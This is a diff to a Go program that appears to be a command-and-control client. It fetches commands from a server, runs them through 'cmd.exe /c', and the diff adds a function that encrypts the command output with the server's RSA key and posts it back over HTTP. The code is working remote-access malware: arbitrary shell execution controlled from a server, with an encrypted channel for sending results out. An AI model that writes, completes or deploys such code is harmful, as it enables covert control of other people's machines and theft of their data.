@@ -5,6 +5,7 @@ import (
 	"crypto"
 	"crypto/rand"
 	"crypto/rsa"
+	"crypto/sha256"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -23,46 +24,6 @@ var DefaultConfig = ClientConfig{ServerHost: "http://localhost", CommunicationEp
 
 var DefaultIdenResult = &IdentificationResult{}
 var EmptyCommand = &Command{}
-
-type Identification struct {
-	Id        string        `json:"id"`
-	Hostname  string        `json:"hostname"`
-	PublicKey rsa.PublicKey `json:"pubkey"`
-}
-
-type IdentificationResult struct {
-	PublicKey rsa.PublicKey `json:"pubkey"`
-}
-
-type ServerIdentity = IdentificationResult
-
-type ClientConfig struct {
-	ServerHost      string
-	CommunicationEp string
-	RecognitionEp   string
-}
-
-type Security struct {
-	PrivateKey *rsa.PrivateKey
-	PublicKey  rsa.PublicKey
-}
-
-type Client struct {
-	Id       string
-	Hostname string
-
-	HttpClient http.Client
-
-	Server ServerIdentity
-
-	Config   ClientConfig
-	Security Security
-	History  []Command
-}
-
-type CommandRequest struct {
-	Id string
-}
 
 func (client *Client) InitClient() bool {
 	uuid := uuid.New()
@@ -199,7 +160,6 @@ func (client *Client) FetchCommand() (*Command, error) {
 	return &fetchedCommand, nil
 }
 
-// for now, a simple shell cmd executor, something more fancy will be implemented in next version.
 func (client *Client) ExecuteCmd(command Command) *exec.Cmd {
 	content := command.Content
 	excCmd := exec.Command("cmd.exe", "/c", content)
@@ -214,4 +174,55 @@ func (client *Client) GetLastExecutedCmd() *Command {
 		return &Command{}
 	}
 	return &client.History[len(history)-1]
+}
+
+func (client *Client) SendCmdOutput(cmd *exec.Cmd, cmdId string) error {
+	config := client.Config
+	httpClient := client.HttpClient
+
+	output, err := cmd.Output()
+
+	if err != nil {
+		return err
+	}
+
+	encryptedOutput, err := rsa.EncryptOAEP(
+		sha256.New(),
+		rand.Reader,
+		&client.Server.PublicKey,
+		output,
+		nil)
+
+	if err != nil {
+		return err
+	}
+
+	encCmdRes := EncryptedCommandResult{
+		Id:              cmdId,
+		EncryptedOutput: encryptedOutput,
+	}
+
+	encCmdResPayload, err := json.Marshal(encCmdRes)
+
+	if err != nil {
+		return err
+	}
+
+	req, err := http.NewRequest(
+		"POST",
+		fmt.Sprintf("%s/%s", config.ServerHost, config.CommunicationEp),
+		bytes.NewReader(encCmdResPayload),
+	)
+
+	if err != nil {
+		return err
+	}
+
+	_, rErr := httpClient.Do(req)
+
+	if rErr != nil {
+		return rErr
+	}
+
+	return nil
 }
